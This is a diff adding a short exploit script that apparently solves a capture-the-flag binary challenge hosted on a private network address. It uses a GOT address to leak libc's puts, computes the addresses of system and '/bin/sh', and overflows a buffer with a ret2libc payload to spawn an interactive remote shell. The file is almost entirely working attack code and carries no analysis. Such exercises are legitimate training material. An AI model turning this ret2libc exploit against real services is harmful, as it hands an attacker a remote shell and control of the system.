@@ -1,0 +1,26 @@
+.got.plt:0804A01C off_804A01C     dd offset puts //134520860
+
+
+.text:0005F140                 public puts ; weak
+
+.text:0003A940                 public system ; weak
+
+0015902B			'/bin/sh'
+
+auth='<deleted>'
+sh=remote("10.214.10.18",11523)
+sh.recvrepeat(timeout = 1)
+sh.sendline(auth)
+sh.recvrepeat(timeout = 1)
+sh.sendline('134520860')
+sh.recvrepeat(timeout = 1)
+
+
+puts=0xf7e52140/*from remote*/
+
+binsh_addr = puts-0x0005F140+0x0015902B
+system_plt = puts-0x0005F140+0x0003A940
+
+payload = flat(['a' * 0x3c, system_plt, 'b' * 4, binsh_addr])
+sh.sendline(payload)
+sh.interactive()
